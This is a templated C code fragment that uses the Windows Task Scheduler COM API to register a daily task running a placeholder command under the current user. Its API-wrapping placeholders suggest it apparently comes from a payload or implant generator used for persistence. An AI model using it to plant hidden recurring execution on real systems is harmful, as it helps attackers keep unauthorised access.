HRESULT hr;
VARIANT vEmpty;
VARIANT vUser;
WCHAR szUserName[256];
DWORD dwUserNameSize = 256;
ITaskService *pService = NULL;
ITaskFolder *pFolder = NULL;
ITaskDefinition *pTask = NULL;
ITriggerCollection *pTriggers = NULL;
ITrigger *pTrigger = NULL;
IActionCollection *pActions = NULL;
IAction *pAction = NULL;
IExecAction *pExecAction = NULL;
IRegisteredTask *pRegisteredTask = NULL;
IPrincipal *pPrincipal = NULL;
BSTR bstrRoot = NULL;
BSTR bstrName = NULL;
BSTR bstrCmd = NULL;
BSTR bstrUser = NULL;
BSTR bstrStartBoundary = NULL;

ZeroMemory(&vEmpty, sizeof(vEmpty));
ZeroMemory(&vUser, sizeof(vUser));

hr = {{ WINAPI("CoInitializeEx") }}(NULL, COINIT_MULTITHREADED);
if (FAILED(hr)) return;

hr = {{ WINAPI("CoCreateInstance") }}(&CLSID_TaskScheduler, NULL,
    CLSCTX_INPROC_SERVER, &IID_ITaskService, (void **)&pService);
if (FAILED(hr)) goto cleanup;

hr = pService->lpVtbl->Connect(pService, vEmpty, vEmpty, vEmpty, vEmpty);
if (FAILED(hr)) goto cleanup;

bstrRoot = {{ WINAPI("SysAllocString") }}(L"\\");
hr = pService->lpVtbl->GetFolder(pService, bstrRoot, &pFolder);
if (FAILED(hr)) goto cleanup;

hr = pService->lpVtbl->NewTask(pService, 0, &pTask);
if (FAILED(hr)) goto cleanup;

{{ WINAPI("GetUserNameW") }}(szUserName, &dwUserNameSize);
bstrUser = {{ WINAPI("SysAllocString") }}(szUserName);

hr = pTask->lpVtbl->get_Principal(pTask, &pPrincipal);
if (FAILED(hr)) goto cleanup;
hr = pPrincipal->lpVtbl->put_UserId(pPrincipal, bstrUser);
if (FAILED(hr)) goto cleanup;
hr = pPrincipal->lpVtbl->put_LogonType(pPrincipal, TASK_LOGON_INTERACTIVE_TOKEN);
if (FAILED(hr)) goto cleanup;
hr = pPrincipal->lpVtbl->put_RunLevel(pPrincipal, TASK_RUNLEVEL_LUA);
if (FAILED(hr)) goto cleanup;

hr = pTask->lpVtbl->get_Triggers(pTask, &pTriggers);
if (FAILED(hr)) goto cleanup;

hr = pTriggers->lpVtbl->Create(pTriggers, TASK_TRIGGER_DAILY, &pTrigger);
if (FAILED(hr)) goto cleanup;
bstrStartBoundary = {{ WINAPI("SysAllocString") }}(L"2025-01-01T09:00:00");
hr = pTrigger->lpVtbl->put_StartBoundary(pTrigger, bstrStartBoundary);
if (FAILED(hr)) goto cleanup;

hr = pTask->lpVtbl->get_Actions(pTask, &pActions);
if (FAILED(hr)) goto cleanup;

hr = pActions->lpVtbl->Create(pActions, TASK_ACTION_EXEC, &pAction);
if (FAILED(hr)) goto cleanup;

hr = pAction->lpVtbl->QueryInterface(pAction,
    &IID_IExecAction, (void **)&pExecAction);
if (FAILED(hr)) goto cleanup;

bstrCmd = {{ WINAPI("SysAllocString") }}(L"{{ command }}");
hr = pExecAction->lpVtbl->put_Path(pExecAction, bstrCmd);
if (FAILED(hr)) goto cleanup;

V_VT(&vUser) = VT_BSTR;
V_BSTR(&vUser) = bstrUser;

bstrName = {{ WINAPI("SysAllocString") }}(L"{{ task_name }}");
hr = pFolder->lpVtbl->RegisterTaskDefinition(pFolder, bstrName, pTask,
    TASK_CREATE_OR_UPDATE, vUser, vEmpty, TASK_LOGON_INTERACTIVE_TOKEN,
    vEmpty, &pRegisteredTask);

cleanup:
if (bstrRoot) {{ WINAPI("SysFreeString") }}(bstrRoot);
if (bstrCmd) {{ WINAPI("SysFreeString") }}(bstrCmd);
if (bstrName) {{ WINAPI("SysFreeString") }}(bstrName);
if (bstrUser) {{ WINAPI("SysFreeString") }}(bstrUser);
if (bstrStartBoundary) {{ WINAPI("SysFreeString") }}(bstrStartBoundary);
if (pRegisteredTask) pRegisteredTask->lpVtbl->Release(pRegisteredTask);
if (pPrincipal) pPrincipal->lpVtbl->Release(pPrincipal);
if (pExecAction) pExecAction->lpVtbl->Release(pExecAction);
if (pAction) pAction->lpVtbl->Release(pAction);
if (pActions) pActions->lpVtbl->Release(pActions);
if (pTrigger) pTrigger->lpVtbl->Release(pTrigger);
if (pTriggers) pTriggers->lpVtbl->Release(pTriggers);
if (pTask) pTask->lpVtbl->Release(pTask);
if (pFolder) pFolder->lpVtbl->Release(pFolder);
if (pService) pService->lpVtbl->Release(pService);
{{ WINAPI("CoUninitialize") }}();
